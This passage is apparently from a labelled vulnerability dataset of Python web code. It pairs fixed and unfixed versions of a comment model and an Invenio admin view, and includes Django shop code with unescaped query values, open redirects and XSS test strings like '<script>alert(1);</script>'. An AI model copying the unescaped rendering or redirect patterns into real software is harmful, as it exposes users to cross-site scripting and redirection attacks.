        self.assertNotIn('href', ce.description)

    def test_manual_hyperlink(self):
        settings.auto_cross_reference = False
        # create 1st CE
        ce = models.CultureEvent(title='Example CE1',
                                 description_plain_text='A first CE')
        ce.save()
        # create 2nd CE with a hyperlink intended
        description_two = 'A second CE, that references {example ce1}'
        ce = models.CultureEvent(title='Example CE2',
                                 description_plain_text=description_two)
        ce.save()
        self.assertEqual(description_two, ce.description_plain_text)
        self.assertIn('href', ce.description)

        # create 3rd CE with no hyperlinks intended
        description_three = 'A second CE, that doesn\'t {reference} example ce1'
        ce = models.CultureEvent(title='Example CE2',
                                 description_plain_text=description_three)
        self.assertEqual(description_three, ce.description_plain_text)
        self.assertNotIn('href', ce.description)

        # test invalid tags not shown
        self.assertIn('{reference}', ce.description_plain_text)
        self.assertNotIn('{reference}', ce.description)

    def test_invalid_HTML_removed(self):
        settings.auto_cross_reference = True
        # create 1st CE
        ce = models.CultureEvent(title='First CE',
                                 description_plain_text='<strong>Example CE1</strong>'
                                                        '<a href=""Dodgywebsite.come"">Click here</a>'
                                                        '<script>Nasty JS</script>')
        ce.save()
        # <script> removed
        self.assertIn('<script>', ce.description_plain_text)
        self.assertNotIn('<script>', ce.description)

        # <a> removed
        self.assertIn('<a href', ce.description_plain_text)
        self.assertNotIn('<a href', ce.description)

        # <strong> allowed
        settings.bleach_allowed = ['strong']
        self.assertIn('<strong>', ce.description_plain_text)
        self.assertIn('<strong>', ce.description)


class TextsModelTest(TestCase):
    def test_string_method(self):
        ce = models.CultureEvent(title='Example CE1')
        text = models.TextModel(ce=ce, phonetic_text='djao')
        self.assertEqual(str(text), 'Text for Example CE1')


# class PictureModelTest(TestCase):
    # def test_invalid_file_type(self):
    #     pic = models.PictureModel(picture='string')
    #     pic.save()
    #
    # def test_valid_upload(self):
    #     ce = models.CultureEvent(title='Test CE')
    #     ce.save()
    #     # image = SimpleUploadedFile('test_image.jpeg', b'file_content',
    #     #         #                                 content_type='image/jpeg')
    #     image = 'test_data/pic(1).JPG'  # requires a uploads folder in project dir
    #     pic = models.PictureModel(ce=ce, picture=image)
    #     pic.save()
    #     pic = models.PictureModel.objects.get(ce=ce)
    #     self.assertEqual(pic.picture, 'test_data/pic(1).JPG')



    # def test_string_method(self):
    #     pass
/n/n/n",0
87,a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37,"/CE/settings.py/n/n
culture_events_shown_on_home_page = 10
auto_cross_reference = True/n/n/n",1
88,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"models/comment.py/n/nimport asyncio

import mistune
import markupsafe
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = markupsafe.escape(await self.content)
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",0
89,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"/models/comment.py/n/nimport asyncio

import mistune
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = await self.content
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",1
90,361def20617cde5a1897c2e81b70bfadaabae608,"invenio_records/admin.py/n/n# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

""""""Admin model views for records.""""""

import json

from flask import flash
from flask_admin.contrib.sqla import ModelView
from flask_babelex import gettext as _
from invenio_admin.filters import FilterConverter
from invenio_db import db
from markupsafe import Markup
from sqlalchemy.exc import SQLAlchemyError

from .api import Record
from .models import RecordMetadata


class RecordMetadataModelView(ModelView):
    """"""Records admin model view.""""""

    filter_converter = FilterConverter()
    can_create = False
    can_edit = False
    can_delete = True
    can_view_details = True
    column_list = ('id', 'version_id', 'updated', 'created',)
    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')
    column_labels = dict(
        id=_('UUID'),
        version_id=_('Revision'),
        json=_('JSON'),
    )
    column_formatters = dict(
        version_id=lambda v, c, m, p: m.version_id-1,
        json=lambda v, c, m, p: Markup(""<pre>{0}</pre>"").format(
            json.dumps(m.json, indent=2, sort_keys=True))
    )
    column_filters = ('created', 'updated', )
    column_default_sort = ('updated', True)
    page_size = 25

    def delete_model(self, model):
        """"""Delete a record.""""""
        try:
            if model.json is None:
                return True
            record = Record(model.json, model=model)
            record.delete()
            db.session.commit()
        except SQLAlchemyError as e:
            if not self.handle_view_exception(e):
                flash(_('Failed to delete record. %(error)s', error=str(e)),
                      category='error')
            db.session.rollback()
            return False
        return True

record_adminview = dict(
    modelview=RecordMetadataModelView,
    model=RecordMetadata,
    category=_('Records'))
/n/n/ntests/test_admin.py/n/n# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

""""""Test admin interface.""""""

from __future__ import absolute_import, print_function

import uuid

from flask import url_for
from flask_admin import Admin, menu
from mock import patch
from sqlalchemy.exc import SQLAlchemyError

from invenio_records.admin import record_adminview
from invenio_records.api import Record


def test_admin(app, db):
    """"""Test flask-admin interace.""""""
    admin = Admin(app, name=""Test"")

    assert 'model' in record_adminview
    assert 'modelview' in record_adminview

    # Register both models in admin
    model = record_adminview.pop('model')
    view = record_adminview.pop('modelview')
    admin.add_view(view(model, db.session, **record_adminview))

    # Check if generated admin menu contains the correct items
    menu_items = {str(item.name): item for item in admin.menu()}
    assert 'Records' in menu_items
    assert menu_items['Records'].is_category()

    submenu_items = {
        str(item.name): item for item in menu_items['Records'].get_children()}
    assert 'Record Metadata' in submenu_items
    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)

    # Create a test record.
    rec_uuid = str(uuid.uuid4())
    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)
    db.session.commit()

    with app.test_request_context():
        index_view_url = url_for('recordmetadata.index_view')
        delete_view_url = url_for('recordmetadata.delete_view')
        detail_view_url = url_for(
            'recordmetadata.details_view', id=rec_uuid)

    with app.test_client() as client:
        # List index view and check record is there.
        res = client.get(index_view_url)
        assert res.status_code == 200

        # Check for XSS in JSON output
        res = client.get(detail_view_url)
        assert res.status_code == 200
        data = res.get_data(as_text=True)
        assert '<pre>{' in data
        assert '}</pre>' in data
        assert '<script>alert(1);</script>' not in data

        # Fake a problem with SQLAlchemy.
        with patch('invenio_records.models.RecordMetadata') as db_mock:
            db_mock.side_effect = SQLAlchemyError()
            res = client.post(
                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
            assert res.status_code == 200

        # Delete it.
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200

        # View the delete record
        res = client.get(detail_view_url)
        assert res.status_code == 200
        assert '<pre>null</pre>' in res.get_data(as_text=True)

        # Delete it again
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200
/n/n/n",0
91,361def20617cde5a1897c2e81b70bfadaabae608,"/invenio_records/admin.py/n/n# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

""""""Admin model views for records.""""""

import json

from flask import flash
from flask_admin.contrib.sqla import ModelView
from flask_babelex import gettext as _
from invenio_admin.filters import FilterConverter
from invenio_db import db
from markupsafe import Markup
from sqlalchemy.exc import SQLAlchemyError

from .api import Record
from .models import RecordMetadata


class RecordMetadataModelView(ModelView):
    """"""Records admin model view.""""""

    filter_converter = FilterConverter()
    can_create = False
    can_edit = False
    can_delete = True
    can_view_details = True
    column_list = ('id', 'version_id', 'updated', 'created',)
    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')
    column_labels = dict(
        id=_('UUID'),
        version_id=_('Revision'),
        json=_('JSON'),
    )
    column_formatters = dict(
        version_id=lambda v, c, m, p: m.version_id-1,
        json=lambda v, c, m, p: Markup(""<pre>{0}</pre>"".format(
            json.dumps(m.json, indent=2, sort_keys=True)))
    )
    column_filters = ('created', 'updated', )
    column_default_sort = ('updated', True)
    page_size = 25

    def delete_model(self, model):
        """"""Delete a record.""""""
        try:
            if model.json is None:
                return True
            record = Record(model.json, model=model)
            record.delete()
            db.session.commit()
        except SQLAlchemyError as e:
            if not self.handle_view_exception(e):
                flash(_('Failed to delete record. %(error)s', error=str(e)),
                      category='error')
            db.session.rollback()
            return False
        return True

record_adminview = dict(
    modelview=RecordMetadataModelView,
    model=RecordMetadata,
    category=_('Records'))
/n/n/n/tests/test_admin.py/n/n# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

""""""Test admin interface.""""""

from __future__ import absolute_import, print_function

import uuid

from flask import url_for
from flask_admin import Admin, menu
from mock import patch
from sqlalchemy.exc import SQLAlchemyError

from invenio_records.admin import record_adminview
from invenio_records.api import Record


def test_admin(app, db):
    """"""Test flask-admin interace.""""""
    admin = Admin(app, name=""Test"")

    assert 'model' in record_adminview
    assert 'modelview' in record_adminview

    # Register both models in admin
    model = record_adminview.pop('model')
    view = record_adminview.pop('modelview')
    admin.add_view(view(model, db.session, **record_adminview))

    # Check if generated admin menu contains the correct items
    menu_items = {str(item.name): item for item in admin.menu()}
    assert 'Records' in menu_items
    assert menu_items['Records'].is_category()

    submenu_items = {
        str(item.name): item for item in menu_items['Records'].get_children()}
    assert 'Record Metadata' in submenu_items
    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)

    # Create a test record.
    rec_uuid = str(uuid.uuid4())
    Record.create({'title': 'test'}, id_=rec_uuid)
    db.session.commit()

    with app.test_request_context():
        index_view_url = url_for('recordmetadata.index_view')
        delete_view_url = url_for('recordmetadata.delete_view')
        detail_view_url = url_for(
            'recordmetadata.details_view', id=rec_uuid)

    with app.test_client() as client:
        # List index view and check record is there.
        res = client.get(index_view_url)
        assert res.status_code == 200

        # Fake a problem with SQLAlchemy.
        with patch('invenio_records.models.RecordMetadata') as db_mock:
            db_mock.side_effect = SQLAlchemyError()
            res = client.post(
                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
            assert res.status_code == 200

        # Delete it.
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200

        # View the delete record
        res = client.get(detail_view_url)
        assert res.status_code == 200
        assert '<pre>null</pre>' in res.get_data(as_text=True)

        # Delete it again
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200
/n/n/n",1
92,6e330d4d44bbfdfce9993dffea97008276771600,"c3shop/frontpage/management/edit_user.py/n/nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest
from django.utils.html import escape
from django.shortcuts import redirect
from django.contrib.auth.models import User
from . import page_skeleton, magic
from .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum
from ..models import Profile, Media
from ..uitools.dataforge import get_csrf_form_element
from .magic import get_current_user
import logging


def render_edit_page(http_request: HttpRequest, action_url: str):

    user_id = None
    profile: Profile = None
    if http_request.GET.get(""user_id""):
        user_id = int(http_request.GET[""user_id""])
    if user_id is not None:
        profile = Profile.objects.get(pk=user_id)
    f = Form()
    f.action_url = action_url
    if profile:
        f.add_content(PlainText('<h3>Edit user ""' + profile.authuser.username + '""</h3>'))
        f.add_content(PlainText('<a href=""/admin/media/select?action_url=/admin/actions/change-user-avatar'
                                '&payload=' + str(user_id) + '""><img class=""button-img"" alt=""Change avatar"" '
                                'src=""/staticfiles/frontpage/change-avatar.png""/></a><br />'))
    else:
        f.add_content(PlainText('<h3>Add new user</h3>'))
    if not profile:
        f.add_content(PlainText(""username (can't be edited later on): ""))
        f.add_content(TextField(name='username'))
    if http_request.GET.get('fault') and profile:
        f.add_content(PlainText(""Unable to edit user due to: "" + str(http_request.GET['fault'])))
    elif http_request.GET.get('fault'):
        f.add_content(PlainText(""Unable to add user due to: "" + str(http_request.GET['fault'])))
    current_user: Profile = get_current_user(http_request)
    if current_user.rights > 3:
        if not profile:
            f.add_content(CheckBox(name=""active"", text=""User Active"", checked=CheckEnum.CHECKED))
        else:
            m: CheckEnum = CheckEnum.CHECKED
            if not profile.active:
                m = CheckEnum.NOT_CHECKED
            f.add_content(CheckBox(name=""active"", text=""User Active"", checked=m))
    if profile:
        f.add_content(PlainText(""Email address: ""))
        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))
        f.add_content(PlainText(""Display name: ""))
        f.add_content(TextField(name='display_name', button_text=profile.displayName))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))
        f.add_content(PlainText(""Rights: ""))
        f.add_content(NumberField(name=""rights"", button_text=str(profile.rights), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', text=str(profile.notes)))
    else:
        f.add_content(PlainText(""Email address: ""))
        f.add_content(TextField(name='email'))
        f.add_content(PlainText(""Display name: ""))
        f.add_content(TextField(name='display_name'))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))
        f.add_content(PlainText(""Rights: ""))
        f.add_content(NumberField(name=""rights"", button_text=str(0), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', placeholder=""Hier knnte ihre Werbung stehen""))
    if profile:
        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))
    else:
        f.add_content(PlainText('<br />Choose a password: '))
    f.add_content(PasswordField(name='password', required=False))
    f.add_content(PlainText('Confirm your password: '))
    f.add_content(PasswordField(name='confirm_password', required=False))
    f.add_content(PlainText(get_csrf_form_element(http_request)))
    f.add_content(SubmitButton())
    # a = page_skeleton.render_headbar(http_request, ""Edit User"")
    a = '<div class=""w3-row w3-padding-64 w3-twothird w3-container admin-popup"">'
    a += f.render_html(http_request)
    # a += page_skeleton.render_footer(http_request)
    a += ""</div>""
    return a


def check_password_conformity(pw1: str, pw2: str):
    if not (pw1 == pw2):
        return False
    if len(pw1) < 6:
        return False
    if pw1.isupper():
        return False
    if pw1.islower():
        return False
    return True


def recreate_form(reason: str):
    return redirect('/admin/users/edit?fault=' + str(reason))


def action_save_user(request: HttpRequest, default_forward_url: str = ""/admin/users""):
    """"""
    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse
    :param request: the HttpRequest
    :param default_forward_url: The URL to forward to if nothing was specified
    :return: The crafted HttpResponse
    """"""
    forward_url = default_forward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if not request.user.is_authenticated:
        return HttpResponseForbidden()
    profile = Profile.objects.get(authuser=request.user)
    if profile.rights < 2:
        return HttpResponseForbidden()
    try:
        if request.GET.get(""user_id""):
            pid = int(request.GET[""user_id""])
            displayname = str(request.POST[""display_name""])
            dect = int(request.POST[""dect""])
            notes = str(request.POST[""notes""])
            pw1 = str(request.POST[""password""])
            pw2 = str(request.POST[""confirm_password""])
            mail = str(request.POST[""email""])
            rights = int(request.POST[""rights""])
            user: Profile = Profile.objects.get(pk=pid)
            user.displayName = escape(displayname)
            user.dect = dect
            user.notes = escape(notes)
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST[""allowed_reservations""])
            if request.POST.get(""active""):
                user.active = magic.parse_bool(request.POST[""active""])
            au: User = user.authuser
            if check_password_conformity(pw1, pw2):
                logging.log(logging.INFO, ""Set password for user: "" + user.displayName)
                au.set_password(pw1)
            else:
                logging.log(logging.INFO, ""Failed to set password for: "" + user.displayName)
            au.email = escape(mail)
            au.save()
            user.save()
        else:
            # assume new user
            username = str(request.POST[""username""])
            displayname = str(request.POST[""display_name""])
            dect = int(request.POST[""dect""])
            notes = str(request.POST[""notes""])
            pw1 = str(request.POST[""password""])
            pw2 = str(request.POST[""confirm_password""])
            mail = str(request.POST[""email""])
            rights = int(request.POST[""rights""])
            if not check_password_conformity(pw1, pw2):
                recreate_form('password mismatch')
            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)
            auth_user.save()
            user: Profile = Profile()
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST[""allowed_reservations""])
            user.displayName = escape(displayname)
            user.authuser = auth_user
            user.dect = dect
            user.notes = escape(notes)
            user.active = True
            user.save()
            pass
        pass
    except Exception as e:
        return HttpResponseBadRequest(str(e))
    return redirect(forward_url)
/n/n/nc3shop/frontpage/management/mediatools/media_actions.py/n/nfrom datetime import date, time
from django.shortcuts import redirect
from django.http import HttpRequest, HttpResponseBadRequest
from django.utils.html import escape
from frontpage.models import Profile, Media, MediaUpload
from frontpage.management.magic import compile_markdown, get_current_user

import logging
import ntpath
import os
import math
import PIL
from PIL import Image


PATH_TO_UPLOAD_FOLDER_ON_DISK: str = ""/usr/local/www/focweb/""
IMAGE_SCALE = 64


def action_change_user_avatar(request: HttpRequest):
    try:
        user_id = int(request.GET[""payload""])
        media_id = int(request.GET[""media_id""])
        user: Profile = Profile.objects.get(pk=int(user_id))
        u: Profile = get_current_user(request)
        if not (u == user) and u.rights < 4:
            return redirect(""/admin?error='You're not allowed to edit other users.'"")
        medium = Media.objects.get(pk=int(media_id))
        user.avatarMedia = medium
        user.save()
    except Exception as e:
        return redirect(""/admin?error="" + str(e))
    return redirect(""/admin/users"")


def handle_file(u: Profile, headline: str, category: str, text: str, file):
    m: Media = Media()
    upload_base_path: str = 'uploads/' + str(date.today().year)
    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace("" "", ""_""))
    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace("" "", ""_""))
    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):
        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)
    with open(high_res_file_name, 'wb+') as destination:
        for chunk in file.chunks():
            destination.write(chunk)
    # TODO crop image
    original = Image.open(high_res_file_name)
    width, height = original.size
    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))
    width /= diameter
    height /= diameter
    width *= IMAGE_SCALE
    height *= IMAGE_SCALE
    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)
    cropped.save(low_res_file_name)
    m.text = escape(text)
    m.cachedText = compile_markdown(escape(text))
    m.category = escape(category)
    m.highResFile = ""/"" + high_res_file_name
    m.lowResFile = ""/"" + low_res_file_name
    m.headline = escape(headline)
    m.save()
    mu: MediaUpload = MediaUpload()
    mu.UID = u
    mu.MID = m
    mu.save()
    logging.info(""Uploaded file '"" + str(file.name) + ""' and cropped it. The resulting PK is "" + str(m.pk))


def action_add_single_media(request: HttpRequest):
    try:
        headline = request.POST[""headline""]
        category = request.POST[""category""]
        text = request.POST[""text""]
        file = request.FILES['file']
        user: Profile = get_current_user(request)
        handle_file(user, headline, category, text, file)
    except Exception as e:
        return redirect(""/admin/media/add?hint="" + str(e))
    return redirect(""/admin/media/add"")


def action_add_multiple_media(request: HttpRequest):
    try:
        category: str = request.POST[""category""]
        files = request.FILES.getlist('files')
        user: Profile = get_current_user(request)
        for f in files:
            handle_file(user, str(f.name), category, ""### There is no media description"", f)
    except Exception as e:
        return redirect(""/admin/media/add?hint="" + str(e))
    return redirect(""/admin/media/add"")
/n/n/nc3shop/frontpage/management/reservation_actions.py/n/nfrom django.http import HttpRequest, HttpResponseRedirect
from django.utils.html import escape
# from django.shortcuts import redirect
from ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation
from .magic import get_current_user
import json
import datetime

RESERVATION_CONSTRUCTION_COOKIE_KEY: str = ""org.technikradio.c3shop.frontpage"" + \
        "".reservation.cookiekey""
EMPTY_COOKY_VALUE: str = '''
{
""notes"": """",
""articles"": [],
""pickup_date"": """"
}
'''


def update_reservation_articles(postdict, rid):
    res: GroupReservation = GroupReservation.objects.get(id=rid)



def add_article_action(request: HttpRequest, default_foreward_url: str):
    forward_url: str = default_foreward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    else:
        forward_url = ""/admin""
    if ""rid"" not in request.GET:
        return HttpResponseRedirect(""/admin?error=Missing%20reservation%20id%20in%20request"")
    u: Profile = get_current_user(request)
    current_reservation = GroupReservation.objects.get(id=str(request.GET[""rid""]))
    if current_reservation.createdByUser != u and u.rights < 2:
        return HttpResponseRedirect(""/admin?error=noyb"")
    if current_reservation.submitted == True:
        return HttpResponseRedirect(""/admin?error=Already%20submitted"")
    # Test for multiple or single article
    if ""article_id"" in request.POST:
        # Actual adding of article
        aid: int = int(request.GET.get(""article_id""))
        quantity: int = int(request.POST[""quantity""])
        notes: str = escape(request.POST[""notes""])
        ar = ArticleRequested()
        ar.AID = Article.objects.get(id=aid)
        ar.RID = current_reservation
        if ""srid"" in request.GET:
            ar.SRID = SubReservation.objects.get(id=int(request.GET[""srid""]))
        ar.amount = quantity
        ar.notes = notes
        ar.save()
    # Actual adding of multiple articles
    else:
        if ""group_id"" not in request.GET:
            return HttpResponseRedirect(""/admin?error=missing%20group%20id"")
        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[""group_id""]))
        for art in Article.objects.all().filter(group=g):
            if str(""quantity_"" + str(art.id)) not in request.POST or str(""notes_"" + str(art.id)) not in request.POST:
                return HttpResponseRedirect(""/admin?error=Missing%20article%20data%20in%20request"")
            amount = int(request.POST[""quantity_"" + str(art.id)])
            if amount > 0:
                ar = ArticleRequested()
                ar.AID = art
                ar.RID = current_reservation
                ar.amount = amount
                if ""srid"" in request.GET:
                    ar.SRID = SubReservation.objects.get(id=int(request.GET[""srid""]))
                ar.notes = escape(str(request.POST[str(""notes_"" + str(art.id))]))
                ar.save()
    if ""srid"" in request.GET:
        response = HttpResponseRedirect(forward_url + ""?rid="" + str(current_reservation.id) + ""&srid="" + request.GET[""srid""])
    else:
        response = HttpResponseRedirect(forward_url + ""?rid="" + str(current_reservation.id))
    return response


def write_db_reservation_action(request: HttpRequest):
    """"""
    This function is used to submit the reservation
    """"""
    u: Profile = get_current_user(request)
    forward_url = ""/admin?success""
    if u.rights > 0:
        forward_url = ""/admin/reservations""
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if ""payload"" not in request.GET:
        return HttpResponseRedirect(""/admin?error=No%20id%20provided"")
    current_reservation = GroupReservation.objects.get(id=int(request.GET[""payload""]))
    if current_reservation.createdByUser != u and u. rights < 2:
        return HttpResponseRedirect(""/admin?error=noyb"")
    current_reservation.submitted = True
    current_reservation.save()
    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)
    return res


def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):
    """"""
    This function is used to alter the reservation beeing build inside
    a cookie. This function automatically crafts the required response.
    """"""
    js_string: str = """"
    r: GroupReservation = None
    u: Profile = get_current_user(request)
    forward_url: str = default_foreward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if ""srid"" in request.GET:
        if not request.GET.get(""rid""):
            return HttpResponseRedirect(""/admin?error=missing%20primary%20reservation%20id"")
        srid: int = int(request.GET[""srid""])
        sr: SubReservation = None
        if srid == 0:
            sr = SubReservation()
        else:
            sr = SubReservation.objects.get(id=srid)
        if request.POST.get(""notes""):
            sr.notes = escape(request.POST[""notes""])
        else:
            sr.notes = "" ""
        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[""rid""]))
        sr.save()
        print(request.POST)
        print(sr.notes)
        return HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])) + ""&srid="" + str(sr.id))
    if ""rid"" in request.GET:
        # update reservation
        r = GroupReservation.objects.get(id=int(request.GET[""rid""]))
    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():
        r = GroupReservation()
        r.createdByUser = u
        r.ready = False
        r.open = True
        r.pickupDate = datetime.datetime.now()
    else:
        return HttpResponseRedirect(""/admin?error=Too%20Many%20reservations"")
    if request.POST.get(""notes""):
        r.notes = escape(request.POST[""notes""])
